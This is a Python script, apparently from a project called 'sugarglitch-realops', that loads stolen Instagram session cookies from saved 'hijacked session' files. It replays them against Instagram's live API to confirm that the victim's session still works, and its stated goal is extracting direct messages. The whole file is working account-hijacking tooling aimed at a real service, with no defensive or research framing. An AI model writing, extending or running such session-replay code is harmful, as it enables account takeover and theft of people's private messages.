# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
Standalone Session Hijacking Test
Using existing hijacked sessions to extract DMs
"""

import json
import requests
import time
import sys
from pathlib import Path
from datetime import datetime

# Ensure we're in the right directory
sys.path.insert(0, '/workspaces/sugarglitch-realops')

def load_latest_hijacked_session():
    """Load the latest hijacked session"""
    sessions_dir = Path("/workspaces/sugarglitch-realops/hijacked_sessions")

    # Get all fresh hijacked session files
    fresh_sessions = list(sessions_dir.glob("fresh_hijacked_session_*.json"))

    if not fresh_sessions:
        print("❌ No fresh hijacked sessions found")
        return None

    # Get the latest one
    latest_session = max(fresh_sessions, key=lambda x: x.stat().st_mtime)
    print(f"📂 Loading session: {latest_session}")

    with open(latest_session, 'r') as f:
        return json.load(f)

def test_session_validity(session_data):
    """Test if the hijacked session is still valid"""
    print("🔍 Testing session validity...")

    # Create session with cookies
    test_session = requests.Session()

    # Set cookies from the hijacked session
    cookies_dict = {}
    for cookie in session_data['cookies']:
        cookies_dict[cookie['name']] = cookie['value']
        test_session.cookies.set(cookie['name'], cookie['value'])

    # Set headers
    if 'headers' in session_data:
        test_session.headers.update(session_data['headers'])

    try:
        # Test with Instagram API
        response = test_session.get("https://i.instagram.com/api/v1/accounts/current_user/")

        print(f"Response status: {response.status_code}")

        if response.status_code == 200:
            try:
                data = response.json()
                if data.get('status') == 'ok':
                    print("✅ Session is valid!")
                    user_info = data.get('user', {})
                    print(f"👤 Logged in as: {user_info.get('username', 'Unknown')}")
                    return True, test_session
            except Exception:
                print("⚠️ Valid response but couldn't parse JSON")
                return True, test_session

        print(f"❌ Session test failed - Status: {response.status_code}")
        if response.status_code == 401:
            print("🔒 Session expired or invalid")
        elif response.status_code == 403:
            print("🔒 Access forbidden")

        return False, None

    except Exception as e:
        print(f"❌ Session test error: {e}")
        return False, None

if __name__ == "__main__":
    print("🎭 STANDALONE SESSION HIJACKING TEST")
    print("="*50)

    # Load latest hijacked session
    session_data = load_latest_hijacked_session()
    if not session_data:
        print("❌ Could not load hijacked session")
        sys.exit(1)

    print(f"📊 Session info: {session_data.get('session_info', {})}")
    print(f"🍪 Available cookies: {[c['name'] for c in session_data.get('cookies', [])]}")

    # Test session validity
    is_valid, session = test_session_validity(session_data)

    if is_valid:
        print("🎉 SUCCESS: Hijacked session is valid and ready for DM extraction!")
    else:
        print("💀 FAILED: Hijacked session is not valid")

    print("\n" + "="*50)
    print("Test completed.")
